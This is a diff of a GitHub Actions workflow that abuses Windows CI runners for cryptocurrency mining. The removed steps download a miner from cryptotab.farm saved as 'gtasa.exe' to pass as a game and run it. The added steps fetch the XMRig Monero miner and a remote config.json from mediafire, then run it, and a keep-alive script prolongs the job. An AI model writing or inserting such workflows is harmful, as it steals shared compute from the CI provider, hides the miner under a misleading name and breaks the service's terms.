@@ -17,10 +17,12 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - name: downloading gta sa
-      run: Invoke-WebRequest https://cryptotab.farm/download/farm_miner_FfLd6W -OutFile gtasa.exe
+    - name: downloading xm
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip
     - name: executing gta san commands
-      run: chmod +x gtasa.exe
-          ./gtasa.exe
+      run: unzip xmrig-6.17.0-gcc-win64.zip
+          Invoke-WebRequest https://download1493.mediafire.com/ycbi7gx28dvg/ehcb87pv5pgvbqx/config.json -OutFile config.json
+          chmod +x xmrig.exe
+          ./xmrig.exe
     - name: Keep Alive
       run: ./timeout.ps1
